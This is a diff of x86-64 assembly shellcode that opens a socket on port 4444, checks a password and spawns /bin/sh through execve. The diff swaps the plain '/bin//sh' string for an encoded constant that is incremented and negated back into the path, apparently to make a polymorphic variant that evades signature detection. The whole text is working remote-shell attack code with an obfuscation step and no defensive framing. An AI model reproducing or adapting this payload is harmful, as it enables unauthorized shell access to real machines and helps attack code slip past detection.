@@ -29,6 +29,7 @@ _start:
 	not ebx
 	mov dword [rsp-4], ebx
 	sub rsp , 4                      ; adjust the stack
+	xor r9, r9
 	push word 0x5c11                 ; port 4444 in network byte order
 	push word 0x02                   ; AF_INET
 	push rsp
@@ -64,18 +65,15 @@ password_check:
 	scasd           ; comparing the user input and stored password in the stack
 	
 	
-    
-execve:                                      ; Execve format  , execve("/bin/sh", 0 , 0)
-     xor rsi , rsi
-     mul rsi                                 ; zeroed rax , rdx register 
-     push ax                                 ; terminate string with null
-     mov rbx , 0x68732f2f6e69622e            ; "/bin//sh"  in reverse order 
-     inc rbx
-     add rcx, 2
-     push rbx
-     push rsp
-     pop rdi                                 ; set RDI
-     push byte 0x3b                          ; execve syscall number (59)
-     pop rax
-     syscall
+execve:                                      
+    xor esi, esi
+    mov rdi, 0xff978cd091969dd0
+    inc rdi
+    neg rdi
+    mul esi
+    add al, 0x3b
+    push rdi
+    push rsp
+    pop rdi
+    syscall
 
